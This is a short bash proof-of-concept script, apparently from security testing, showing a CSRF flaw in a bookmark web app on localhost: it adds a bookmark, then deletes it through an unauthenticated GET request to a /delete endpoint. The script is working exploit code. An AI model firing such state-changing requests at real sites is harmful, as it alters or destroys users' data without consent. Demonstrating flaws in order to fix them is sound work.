#!/bin/bash
# POC: CSRF Vulnerability on DELETE endpoint
# Demonstrates GET-based state-changing operation without CSRF protection

TARGET="http://localhost:5000"

# Setup: Create a bookmark
curl -s -c /tmp/test_csrf.txt "$TARGET/list" > /dev/null
curl -s -b /tmp/test_csrf.txt -c /tmp/test_csrf.txt -X POST "$TARGET/add" \
  -d "name=CSRFTest&url=http://test.com" > /dev/null

echo "[*] Before CSRF: "
curl -s -b /tmp/test_csrf.txt "$TARGET/list" | grep -c "CSRFTest" || echo 0

# Execute CSRF - any GET request to /delete will delete a bookmark
curl -s "$TARGET/delete?name=CSRFTest" > /dev/null

echo "[*] After CSRF delete: "
curl -s -b /tmp/test_csrf.txt "$TARGET/list" | grep -c "CSRFTest" || echo 0
echo "[!] Bookmark was deleted via CSRF"
